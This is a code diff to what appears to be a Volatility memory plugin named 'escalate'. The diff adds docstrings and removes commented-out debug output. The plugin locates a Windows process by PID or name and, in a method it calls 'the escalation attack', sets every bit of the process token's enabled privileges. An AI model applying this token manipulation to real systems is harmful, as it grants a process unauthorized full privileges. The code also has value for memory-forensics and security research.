@@ -46,6 +46,11 @@ class escalate(common.AbstractWindowsCommand):
         self._proc = None
 
     def get_target_proc(self, pid):
+        '''
+        Gets the target process' data structure
+        :param pid: The target PID
+        :return: The target process
+        '''
         procs = win32.tasks.pslist(self._addrspace)
 
         for proc in procs:
@@ -57,11 +62,20 @@ class escalate(common.AbstractWindowsCommand):
 
 
     def perform_atack(self):
+        '''
+        Performs the escalation attack
+        :return: Nothing
+        '''
         token = self._proc.get_token()
         token.Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
 
 
     def get_pid_from_name(self, name):
+        '''
+        Gets the PID of a process if name is given
+        :param name: THe target process' name
+        :return: The target process' PID
+        '''
         for proc in win32.tasks.pslist(self._addrspace):
             if str(proc.ImageFileName) == name:
                 return proc.UniqueProcessId.v()
@@ -79,10 +93,3 @@ class escalate(common.AbstractWindowsCommand):
         self._proc = self.get_target_proc(pid)
 
         self.perform_atack()
-        # print self._proc.get_token().Privileges.Enabled
-        # outfd.write("Pid: {}\n".format(pid))
-        # outfd.write("Current context: {0} @ {1:#x}, pid={2}, ppid={3} DTB={4:#x}\n".format(self._proc.ImageFileName,
-        #                                                                                  self._proc.obj_offset,
-        #                                                                                  self._proc.UniqueProcessId.v(),
-        #                                                                                  self._proc.InheritedFromUniqueProcessId.v(),
-        #                                                                                  self._proc.Pcb.DirectoryTableBase.v()).format(pid))
